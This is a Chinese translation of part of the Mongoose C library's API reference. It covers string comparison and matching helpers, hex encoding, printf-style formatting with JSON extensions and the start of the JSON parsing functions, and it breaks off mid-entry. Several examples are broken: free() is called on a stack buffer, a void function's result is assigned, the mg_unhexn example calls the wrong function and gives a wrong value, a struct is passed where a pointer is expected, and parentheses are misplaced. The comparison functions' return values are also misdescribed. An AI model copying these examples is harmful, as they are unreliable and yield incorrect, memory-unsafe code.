<h4 id="mg-str-n"><a href="#mg-str-n" class="headerlink" title="mg_str_n()"></a><code>mg_str_n()</code></h4><ul>
<li><code>struct mg_str mg_str_n(const char *s, size_t n);</code></li>
<li>从C-string（可以是<code>non-NULL terminated</code>，长度由<code>n</code>指定）创建Mongoose string。这个函数不重复提供字符串，并且将指针存储在创建的<code>mg_str</code>结构中</li>
<li>参数：<ul>
<li><code>s</code>  –  指向需要存储到创建的<code>mg_str</code>的字符串</li>
<li><code>n</code>  –  字符串长度</li>
</ul>
</li>
<li>返回值：创建的Mongoose string</li>
<li>示例：<ul>
<li><code>struct mg_str str = mg_str_n(&quot;hi&quot;, 2);</code></li>
</ul>
</li>
</ul>
<h4 id="mg-casecmp"><a href="#mg-casecmp" class="headerlink" title="mg_casecmp()"></a><code>mg_casecmp()</code></h4><ul>
<li><code>int mg_casecmp(const char *s1, const char *s2);</code></li>
<li>不区分大小写的，比较两个 NULL-terminated strings</li>
<li>参数：<ul>
<li><code>s1</code>, <code>s2</code>  –  指向两个需要比较的字符串的指针</li>
</ul>
</li>
<li>返回值：<ul>
<li>如果两个字符串相等，则返回0</li>
<li>如果第一个参数比第二个参数长，则返回大于0的数</li>
<li>如果第一个参数比第二个参数短，则返回小于0的数</li>
</ul>
</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (mg_casecmp(&quot;hello&quot;, &quot;HELLO&quot;) == 0) &#123;</span><br><span class="line">  // Strings are equal</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-ncasecmp"><a href="#mg-ncasecmp" class="headerlink" title="mg_ncasecmp()"></a><code>mg_ncasecmp()</code></h4><ul>
<li><code>int mg_ncasecmp(const char *s1, const char *s2, size_t len);</code></li>
<li>不区分大小写的比较两个C-strings的前<code>len</code>个字符，或者遇到<code>\0</code>字符</li>
<li>参数：<ul>
<li><code>s1</code>, <code>s2</code>  –  指向需要比较的两个字符串</li>
<li><code>len</code>   –  比较的最大长度</li>
</ul>
</li>
<li>返回值：<ul>
<li>如果两个字符串相等，则返回0</li>
<li>如果第一个参数比第二个参数长，则返回大于0的数</li>
<li>如果第一个参数比第二个参数短，则返回小于0的数</li>
</ul>
</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (mg_ncasecmp(&quot;hello1&quot;, &quot;HELLO2&quot;, 5) == 0) &#123;</span><br><span class="line">  // Strings are equal</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-vcmp"><a href="#mg-vcmp" class="headerlink" title="mg_vcmp()"></a><code>mg_vcmp()</code></h4><ul>
<li><code>int mg_vcmp(const struct mg_str *s1, const char *s2);</code></li>
<li>比较 mongoose string 和 C-string</li>
<li>参数：<ul>
<li><code>s1</code>  –  指向需要比较的 mongoose string</li>
<li><code>s2</code>  –  指向需要比较的 C-string</li>
</ul>
</li>
<li>返回值：<ul>
<li>如果两个字符串相等，则返回0</li>
<li>如果第一个参数比第二个参数长，则返回大于0的数</li>
<li>如果第一个参数比第二个参数短，则返回小于0的数</li>
</ul>
</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct mg_str str = mg_str(&quot;hello&quot;);</span><br><span class="line">if (mg_vcmp(str, &quot;hello&quot;) == 0) &#123;</span><br><span class="line">  // Strings are equal</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-vcasecmp"><a href="#mg-vcasecmp" class="headerlink" title="mg_vcasecmp()"></a><code>mg_vcasecmp()</code></h4><ul>
<li><code>int mg_vcasecmp(const struct mg_str *str1, const char *str2);</code></li>
<li>不区分大小的比较 mongoose string 和 C-string</li>
<li>参数：<ul>
<li><code>s1</code>  –  指向需要比较的 mongoose string</li>
<li><code>s2</code>  –  指向需要比较的 C-string</li>
</ul>
</li>
<li>返回值：<ul>
<li>如果两个字符串相等，则返回0</li>
<li>如果第一个参数比第二个参数长，则返回大于0的数</li>
<li>如果第一个参数比第二个参数短，则返回小于0的数</li>
</ul>
</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct mg_str str = mg_str(&quot;hello&quot;);</span><br><span class="line">if (mg_vcasecmp(str, &quot;HELLO&quot;) == 0) &#123;</span><br><span class="line">  // Strings are equal</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-strcmp"><a href="#mg-strcmp" class="headerlink" title="mg_strcmp()"></a><code>mg_strcmp()</code></h4><ul>
<li><code>int mg_strcmp(const struct mg_str str1, const struct mg_str str2);</code></li>
<li>比较两个 mongoose strings</li>
<li>参数：<ul>
<li><code>str1</code>, <code>str2</code>  –  指向两个需要比较的 mongoose strings</li>
</ul>
</li>
<li>返回值：<ul>
<li>如果两个字符串相等，则返回0</li>
<li>如果第一个参数比第二个参数长，则返回大于0的数</li>
<li>如果第一个参数比第二个参数短，则返回小于0的数</li>
</ul>
</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct mg_str str1 = mg_str(&quot;hello&quot;);</span><br><span class="line">struct mg_str str2 = mg_str(&quot;hello&quot;);</span><br><span class="line">if (mg_strcmp(str1, str2) == 0) &#123;</span><br><span class="line">  // Strings are equal</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-strdup"><a href="#mg-strdup" class="headerlink" title="mg_strdup()"></a><code>mg_strdup()</code></h4><ul>
<li><code>struct mg_str mg_strdup(const struct mg_str s);</code></li>
<li>重复提供的字符串。返回一个新的字符串或者<code>MG_NULL_STR</code>表示错误。</li>
<li>注意：<ul>
<li>这个函数为返回的字符串分配内存。需要使用<code>free()</code>函数释放</li>
</ul>
</li>
<li>参数：<ul>
<li><code>s</code>  –  需要重复的 mongoose string</li>
</ul>
</li>
<li>返回值：重复的字符串</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct mg_str str1 = mg_str(&quot;hello&quot;);</span><br><span class="line">struct mg_str str2 = mg_strdup(str1);</span><br><span class="line">//...</span><br><span class="line">free((void *)str2.ptr);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-strstr"><a href="#mg-strstr" class="headerlink" title="mg_strstr()"></a><code>mg_strstr()</code></h4><ul>
<li><code>const char *mg_strstr(const struct mg_str haystack, const struct mg_str needle)</code></li>
<li>在<code>haystack</code>字符串中查找<code>needle</code>子字符串</li>
<li>参数：<ul>
<li><code>haystack</code>  –  需要查找子字符串的 mongoose string</li>
<li><code>needle</code>    –  需要查找的 mongoose string</li>
</ul>
</li>
<li>返回值：<ul>
<li>返回一个指向<code>neddle</code>在<code>haystack</code>中发生的位置的指针</li>
<li>失败，返回NULL</li>
</ul>
</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct mg_str str = mg_str(&quot;Hello, world&quot;);</span><br><span class="line">struct mg_str sub_str = mg_str(&quot;world&quot;);</span><br><span class="line"></span><br><span class="line">if (mg_strstr(str, sub_str) != NULL) &#123;</span><br><span class="line">  // Found</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-strstrip"><a href="#mg-strstrip" class="headerlink" title="mg_strstrip()"></a><code>mg_strstrip()</code></h4><ul>
<li><code>struct mg_str mg_strstrip(struct mg_str s)</code></li>
<li>删除 mongoose string <code>s</code>的头部和尾部的空格</li>
<li>参数：<ul>
<li><code>s</code>  –  需要修剪的 mongoose string</li>
</ul>
</li>
<li>返回值：输入的字符串</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct mg_str str = mg_strstrip(mg_str(&quot;   Hello, world   &quot;));</span><br><span class="line">if (mg_vcmp(str, &quot;Hello, world&quot;) == 0) &#123;</span><br><span class="line">  // Strings are equal</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-match"><a href="#mg-match" class="headerlink" title="mg_match()"></a><code>mg_match()</code></h4><ul>
<li><code>bool mg_match(struct mg_str str, struct mg_str pattern, struct mg_str *caps);</code></li>
<li>检查字符串<code>str</code>是否匹配<code>pattern</code>，可选地将通配符捕获到提供的数组<code>caps</code>中</li>
<li>注意：<ul>
<li>如果<code>caps</code>是非空的，那么<code>caps</code>数组的大小最小为<code>pattern</code>的长度加1.</li>
<li>最后的 cap 将会被初始化成一个空的字符串</li>
</ul>
</li>
<li>全局匹配规则：<ul>
<li><code>?</code>  –  匹配任何单个字符</li>
<li><code>*</code>  –  匹配0个或多个字符，除了<code>/</code></li>
<li><code>#</code>  –  匹配0个或多个字符</li>
<li>任何其他字符只匹配它自身</li>
</ul>
</li>
<li>参数：<ul>
<li><code>str</code>    –  需要匹配的字符串</li>
<li><code>patter</code> –  与之匹配的规则（模式）</li>
<li><code>caps</code>   –  通配符符号的可选捕获数组<code>?</code>, <code>*</code>, <code>#</code></li>
</ul>
</li>
<li>返回值：<ul>
<li>匹配成功，返回true</li>
<li>其他情况，返回false</li>
</ul>
</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// Assume that hm-&gt;uri holds /foo/bar. Then we can match the requested URI:</span><br><span class="line">struct mg_str caps[3];  // Two wildcard symbols &#x27;*&#x27; plus 1</span><br><span class="line">if (mg_match(hm-&gt;uri, mg_str(&quot;/*/*&quot;), caps)) &#123;</span><br><span class="line">  // caps[0] holds `foo`, caps[1] holds `bar`.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-commalist"><a href="#mg-commalist" class="headerlink" title="mg_commalist()"></a><code>mg_commalist()</code></h4><ul>
<li><code>bool mg_commalist(struct mg_str *s, struct mg_str *k, struct mg_str *v);</code></li>
<li>解析字符串S，这是一个分隔的条目列表。条目可以是任意字符串，该字符串存储在<code>v</code>中，或者分别存储在<code>k</code>和<code>v</code>中的<code>KEY=VALUE</code></li>
<li>重要：<ul>
<li>此函数通过指向下一个条目来修改<code>s</code>。</li>
</ul>
</li>
<li>参数：<ul>
<li><code>s</code>  –  需要搜索条目的字符串</li>
<li><code>k</code>  –  一个指向<code>mg_str</code>的指针，接收条目键</li>
<li><code>v</code>  –  一个指向<code>mg_str</code>的指针，接收条目值</li>
</ul>
</li>
<li>返回值：<ul>
<li>如果条目被找到，返回true</li>
<li>其他情况，返回false</li>
</ul>
</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct mg_str k, v, s = mg_str(&quot;a=333,b=777&quot;);</span><br><span class="line">while (mg_commalist(&amp;s, &amp;k, &amp;v))                      // This loop output:</span><br><span class="line">  printf(&quot;[%.*s] set to [%.*s]\n&quot;,                    // [a] set to [333]</span><br><span class="line">         (int) k.len, k.ptr, (int) v.len, v.ptr);     // [b] set to [777]</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-hex"><a href="#mg-hex" class="headerlink" title="mg_hex()"></a><code>mg_hex()</code></h4><ul>
<li><code>char *mg_hex(const void *buf, size_t len, char *dst);</code></li>
<li>十六进制编码的二进制数据<code>buf</code>，<code>len</code>输入到一个缓冲区<code>dst</code>，并将其终止。这个输出缓冲区至少比<code>2 x len + 1</code>大</li>
<li>参数：<ul>
<li><code>buf</code>  –  十六进制编码的数据</li>
<li><code>len</code>  –  数据长度</li>
<li><code>dst</code>  –  指向输出缓冲区的指针</li>
</ul>
</li>
<li>返回值：<ul>
<li>返回<code>dst</code>指针。这个编码的字符是小写的</li>
</ul>
</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">char data[] = &quot;\x1\x2\x3&quot;;</span><br><span class="line">char buf[sizeof(data)*2];</span><br><span class="line">char *hex = mg_hex(data, sizeof(data) - 1, buf);</span><br><span class="line">LOG(LL_INFO, (&quot;%s&quot;, hex)); // Output &quot;010203&quot;;</span><br><span class="line">free(hex);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-unhex"><a href="#mg-unhex" class="headerlink" title="mg_unhex()"></a><code>mg_unhex()</code></h4><ul>
<li><code>void mg_unhex(const char *buf, size_t len, unsigned char *to);</code></li>
<li>十六进制字符串<code>buf</code>，<code>len</code>输入到缓冲区<code>to</code>。这个缓冲区<code>to</code>必须大于<code>lsn / 2</code></li>
<li>参数：<ul>
<li><code>buf</code>  –  需要十六进制解码的数据</li>
<li><code>len</code>  –  数据大小</li>
<li><code>to</code>   –  指向输出缓冲区的指针</li>
</ul>
</li>
<li>返回值：无</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char data[] = &quot;010203&quot;;</span><br><span class="line">char *buf[sizeof(data)/2];</span><br><span class="line">char *hex = mg_unhex(data, sizeof(data) - 1, buf); // buf is now [1,2,3]</span><br><span class="line">free(hex);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-unhexn"><a href="#mg-unhexn" class="headerlink" title="mg_unhexn()"></a><code>mg_unhexn()</code></h4><ul>
<li><code>unsigned long mg_unhexn(const char *s, size_t len);</code></li>
<li>解析十六进制编码的字符串<code>s</code>的<code>len</code>个字节。这个<code>len</code>最大值为<code>long x 2</code>的宽度，例如：32-bit platform it is 8</li>
<li>参数：<ul>
<li><code>s</code>   –  需要解析的字符串</li>
<li><code>len</code> –  字符串长度</li>
</ul>
</li>
<li>返回值：返回解析的值</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char data[] = &quot;010203&quot;;</span><br><span class="line">char *buf[sizeof(data)/2];</span><br><span class="line">unsigned long val = mg_unhex(data, sizeof(data) - 1); // val is now 123</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-remove-double-dots"><a href="#mg-remove-double-dots" class="headerlink" title="mg_remove_double_dots()"></a><code>mg_remove_double_dots()</code></h4><ul>
<li><code>char *mg_remove_double_dots(char *s);</code></li>
<li>通过从中删除双点，修改字符串<code>s</code>。用于修改从网络收到的文件名或URI</li>
<li>参数：<ul>
<li><code>s</code>  –  需要修改的字符串</li>
</ul>
</li>
<li>返回值：返回<code>s</code>指针</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char data[] = &quot;../../a.txt&quot;;</span><br><span class="line">mg_remove_double_dots(data);  // data is /a.txt</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-snprintf-mg-vsnprintf"><a href="#mg-snprintf-mg-vsnprintf" class="headerlink" title="mg_snprintf(), mg_vsnprintf()"></a><code>mg_snprintf(), mg_vsnprintf()</code></h4><ul>
<li><code>size_t mg_snprintf(char *buf, size_t len, const char *fmt, ...);</code></li>
<li><code>size_t mg_vsnprintf(char *buf, size_t len, const char *fmt, va_list ap);</code></li>
<li>像<code>snprintf()</code>标准函数一样，打印格式的字符串到字符串缓冲区中,但是以一种可预测的方式，不取决于C库或构建环境。返回值可以大于缓冲区长度<code>len</code>，在这种情况下，溢出字节未打印。Mongoose库通常用于以JSON格式交换数据因此，还支持非标准<code>％q</code>，<code>％v</code>，<code>％h</code>指定符用于格式化JSON字符串</li>
<li>参数：<ul>
<li><code>buf</code>  –  指向输出缓冲区的指针</li>
<li><code>len</code>  –  缓冲区大小</li>
<li><code>fmt</code>  –  类似于printf的格式字符串</li>
</ul>
</li>
<li>支持格式指定符<ul>
<li><code>hhd</code>, <code>hd</code>, <code>d</code>, <code>ld</code>, <code>lld</code>  –  用于 <code>char</code>, <code>short</code>, <code>int</code>, <code>long</code>, <code>int64_t</code></li>
<li><code>hhu</code>, <code>hu</code>, <code>u</code>, <code>lu</code>, <code>llu</code>  –  相同，但是用于无符号</li>
<li><code>hhx</code>, <code>hx</code>, <code>x</code>, <code>lx</code>, <code>llx</code>  –  相同，无符号并且以十六进制输出</li>
<li><code>s</code>  –  对应<code>char *</code></li>
<li><code>q</code>  –  对应<code>char *</code>，输出JSON格式字符串(extension)</li>
<li><code>Q</code>  –  对应<code>char *</code>，输出双引号的JSON格式字符串(extension)</li>
<li><code>H</code>  –  对应<code>int</code>, <code>void *</code>, 输出双引号的十六进制字符串(extension)</li>
<li><code>I</code>  –  对应<code>int</code>（4 或 6）， <code>void *</code>, 输出IP地址(extension)</li>
<li><code>A</code>  –  对应<code>void *</code>， 输出硬件地址(extension)</li>
<li><code>V</code>  –  对应<code>int</code>, <code>void *</code>， 输出双引号的base64 字符串(extension)</li>
<li><code>M</code>  –  对应<code>mg_pfn_t</code>，调用另一个输出函数(extension)</li>
<li><code>g</code>, <code>f</code>  –  对应<code>double</code></li>
<li><code>c</code>  –  对应<code>char</code></li>
<li><code>%</code>  –  对应<code>%</code>字符自己</li>
<li><code>p</code>  –  对应任何指针，输出<code>0x....</code>十六进制值</li>
<li><code>%X.Y</code>  –  可选宽度和精度修饰符</li>
<li><code>%.*</code>   –  可选的精度修饰符指定为<code>int</code>参数</li>
</ul>
</li>
<li>返回值：返回打印的字节数</li>
<li>发送一个JSON HTTP response： <ul>
<li><code>mg_http_reply(c, 200, &quot;Content-Type: application/json\r\n&quot;, &quot;&#123; %Q: %g&#125;&quot;, &quot;value&quot;, 1.2345);</code></li>
</ul>
</li>
<li>使用更复杂格式字符串的示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mg_snprintf(buf, sizeof(buf), &quot;%lld&quot;, (int64_t) 123);   // 123</span><br><span class="line">mg_snprintf(buf, sizeof(buf), &quot;%.2s&quot;, &quot;abcdef&quot;);        // ab</span><br><span class="line">mg_snprintf(buf, sizeof(buf), &quot;%.*s&quot;, 2, &quot;abcdef&quot;);     // ab</span><br><span class="line">mg_snprintf(buf, sizeof(buf), &quot;%05x&quot;, 123);             // 00123</span><br><span class="line">mg_snprintf(buf, sizeof(buf), &quot;%%-%3s&quot;, &quot;a&quot;);           // %-  a</span><br><span class="line">mg_snprintf(buf, sizeof(buf), &quot;hi, %Q&quot;, &quot;a&quot;);           // hi, &quot;a&quot;</span><br><span class="line">mg_snprintf(buf, sizeof(buf), &quot;r: %M, %d&quot;, f,1,2,7);    // r: 3, 7</span><br><span class="line">mg_snprintf(buf, sizeof(buf), &quot;%I&quot;, 4, &quot;abcd&quot;);         // 97.98.99.100</span><br><span class="line">mg_snprintf(buf, sizeof(buf), &quot;%A&quot;, &quot;abcdef&quot;);          // 61:62:63:64:65:66</span><br><span class="line"></span><br><span class="line">// Printing sub-function for %M specifier. Grabs two int parameters</span><br><span class="line">size_t f(void (*out)(char, void *), void *ptr, va_list *ap) &#123;</span><br><span class="line">  int a = va_arg(*ap, int);</span><br><span class="line">  int b = va_arg(*ap, int);</span><br><span class="line">  return mg_xprintf(out, ptr, &quot;%d&quot;, a + b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-mprintf-mg-vmprintf"><a href="#mg-mprintf-mg-vmprintf" class="headerlink" title="mg_mprintf(), mg_vmprintf()"></a><code>mg_mprintf(), mg_vmprintf()</code></h4><ul>
<li><code>char *mg_mprintf(const char *fmt, ...);</code></li>
<li><code>char *mg_vmprintf(const char *fmt, va_list *ap);</code></li>
<li>将消息打印输出到分配的缓冲区中。调用者必须手动释放缓冲区</li>
<li>参数：<ul>
<li><code>fmt</code>  –  类似于printf的格式字符串</li>
</ul>
</li>
<li>返回值：分配的内存缓冲区</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char *msg = mg_mprintf(&quot;Double quoted string: %Q!&quot;, &quot;hi&quot;);</span><br><span class="line">free(msg);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-xprintf-mg-vxprintf"><a href="#mg-xprintf-mg-vxprintf" class="headerlink" title="mg_xprintf(), mg_vxprintf()"></a><code>mg_xprintf(), mg_vxprintf()</code></h4><ul>
<li><code>size_t mg_xprintf(void (*out)(char, void *), void *param, const char *fmt, ...);</code></li>
<li><code>size_t mg_vxprintf(void (*out)(char, void *), void *param, const char *fmt, va_list *ap);</code></li>
<li>使用指定字符输出函数打印消息</li>
<li>参数：<ul>
<li><code>out</code>   –  被用于打印字符的函数</li>
<li><code>param</code> –  被传给<code>out</code>的参数</li>
<li><code>fmt</code>   –  类似于printf的格式字符串</li>
</ul>
</li>
<li>返回值：返回打印的字节数</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void myfn(char c, void *p);</span><br><span class="line"></span><br><span class="line">size_t len = mg_xprintf(myfn, myfn_p, &quot;Double quoted string: %Q!&quot;, &quot;hi&quot;);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-pfn-iobuf"><a href="#mg-pfn-iobuf" class="headerlink" title="mg_pfn_iobuf()"></a><code>mg_pfn_iobuf()</code></h4><ul>
<li><code>void mg_pfn_iobuf(char ch, void *param);</code></li>
<li>将一个字符打印到通用IO缓冲区 <code>Generic IO buffer</code></li>
<li>参数：<ul>
<li><code>ch</code>    –  被打印的字节</li>
<li><code>param</code> –  必须是<code>struct mg_iobuf *</code></li>
</ul>
</li>
<li>示例：<ul>
<li><code>mg_xprintf(mg_pfn_iobuf, &amp;c-&gt;send, &quot;hi!&quot;);  // Append to the output buffer</code></li>
</ul>
</li>
</ul>
<h4 id="mg-to64"><a href="#mg-to64" class="headerlink" title="mg_to64()"></a><code>mg_to64()</code></h4><ul>
<li><code>int64_t mg_to64(struct mg_str str);</code></li>
<li><code>uint64_t mg_tou64(struct mg_str str);</code></li>
<li>解析字符串持有的64位整数的值。</li>
<li>参数：<ul>
<li><code>str</code>  –  需要解析的字符串</li>
</ul>
</li>
<li>返回值：解析的值</li>
<li>示例：<ul>
<li><code>int64_t val = mg_to64(mg_str(&quot;123&quot;)); // Val is now 123</code></li>
</ul>
</li>
</ul>
<h4 id="mg-aton"><a href="#mg-aton" class="headerlink" title="mg_aton()"></a><code>mg_aton()</code></h4><ul>
<li><code>bool mg_aton(struct mg_str str, struct mg_addr *addr);</code></li>
<li>解析存储在<code>str</code>的IP地址，并将结果存储在<code>addr</code></li>
<li>参数：<ul>
<li><code>str</code>   –  需要解析的字符串，例如：<code>1.2.3.4</code>, <code>[::1]</code>, <code>01:02::03</code></li>
<li><code>addr</code>  –  指向接收解析结果的<code>mg_addr</code>字符串的指针</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功，返回true</li>
<li>其他情况，返回false</li>
</ul>
</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct mg_addr addr;</span><br><span class="line">if (mg_aton(mg_str(&quot;127.0.0.1&quot;), &amp;addr)) &#123;</span><br><span class="line">  // addr is now binary representation of 127.0.0.1 IP address</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-8-JSON-API"><a href="#1-8-JSON-API" class="headerlink" title="1.8 JSON API"></a>1.8 JSON API</h3><ul>
<li>请注意，Mongoose的打印功能支持非标准格式指定Q和％m，它们可以轻松打印JSON字符串：<ul>
<li><code>char *json = mg_mprintf(&quot;&#123; %Q:%d&#125;&quot;, &quot;value&quot;, 123);  // &#123;&quot;value&quot;:123&#125;</code></li>
<li><code>free(json);</code></li>
</ul>
</li>
<li>因此，对于完整的JSON支持，需要一组解析功能 - 如下所述。</li>
</ul>
<h4 id="mg-json-get"><a href="#mg-json-get" class="headerlink" title="mg_json_get()"></a><code>mg_json_get()</code></h4><ul>
<li><code>enum &#123; MG_JSON_TOO_DEEP = -1, MG_JSON_INVALID = -2, MG_JSON_NOT_FOUND = -3 &#125;;</code></li>
<li><code>int mg_json_get(struct mg_str json, const char *path, int *toklen);</code></li>
<li>解析JSON字符串<code>json</code>，并且返回JSON <code>path</code> 指定的元素的偏移。这个元素的长度被存储在<code>toklen</code></li>
<li>参数：<ul>
<li><code>json</code>  –  保存有一个有效JSON的字符串</li>
<li><code>path</code>  –  一个JSON 路径，必须由<code>$</code>开始，例如：<code>$.user</code></li>
<li><code>toklen</code> –  指向接收元素的长度的指针，可以为NULL</li>
</ul>
</li>
<li>返回值：<ul>
<li>返回元素的偏移量</li>
<li>返回负数 <code>MG_JSON_*</code>表示错误</li>
</ul>
</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// Create a json string: &#123; &quot;a&quot;: 1, &quot;b&quot;: [2, 3] &#125;</span><br><span class="line">char *buf = mg_mprintf(&quot;&#123; %Q: %d, %Q: [%d, %d] &#125;&quot;, &quot;a&quot;, 1, &quot;b&quot;, 2, 3);</span><br><span class="line">struct mg_str json = mg_str(buf);</span><br><span class="line">int offset, length;</span><br><span class="line"></span><br><span class="line">// Lookup &quot;$&quot;, which is the whole JSON. Can be used for validation</span><br><span class="line">offset = mg_json_get(json, &quot;$&quot;, &amp;length);    // offset = 0, length = 23</span><br><span class="line"></span><br><span class="line">// Lookup attribute &quot;a&quot;. Point to value &quot;1&quot;</span><br><span class="line">offset = mg_json_get(json, &quot;$.a&quot;, &amp;length);  // offset = 7, length = 1</span><br><span class="line"></span><br><span class="line">// Lookup attribute &quot;b&quot;. Point to array [2, 3]</span><br><span class="line">offset = mg_json_get(json, &quot;$.b&quot;, &amp;length);  // offset = 15, length = 6</span><br><span class="line"></span><br><span class="line">// Lookup attribute &quot;b[1]&quot;. Point to value &quot;3&quot;</span><br><span class="line">offset = mg_json_get(json, &quot;$.b[1]&quot;, &amp;length); // offset = 19, length = 1</span><br><span class="line"></span><br><span class="line">free(buf);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-json-get-num"><a href="#mg-json-get-num" class="headerlink" title="mg_json_get_num()"></a><code>mg_json_get_num()</code></h4><ul>
<li><code>bool mg_json_get_num(struct mg_str json, const char *path, double *v);</code></li>
<li>在JSON路径<code>path</code>，从<code>json</code>字符串获取数字值(double)。如果成功，返回true</li>
<li>参数：<ul>
<li><code>json</code>  –  保存有效JSON字符串</li>
<li><code>path</code>  –  一个JSON路径。必须以<code>$</code>开始</li>
<li><code>v</code>     –  一个对应于值的占位符</li>
</ul>
</li>
<li>返回值：<ul>
<li>成功，返回true</li>
<li>失败，返回false</li>
</ul>
</li>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">double d = 0.0;</span><br><span class="line">mg_json_get_num(mg_str(&quot;[1,2,3]&quot;, &quot;$[1]&quot;, &amp;d));     // d contains 2</span><br><span class="line">mg_json_get_num(mg_str(&quot;&#123;\&quot;a\&quot;:1.23&#125;&quot;, &quot;$.a&quot;, &amp;d)); // d contains 1.23</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="mg-json-get-bool"><a href="#mg-json-get-bool" class="headerlink" title="mg_json_get_bool()"></a><code>mg_json_get_bool()</code></h4><ul>
<li><code>bool mg_json_get_bool(struct mg_str json, const char *path, bool *v);</code></li>
<li>在JSON路径<code>path</code>，从<code>json</code>字符串获取布尔值(bool)。如果成功，返回true</li>
<li>参数：<ul>
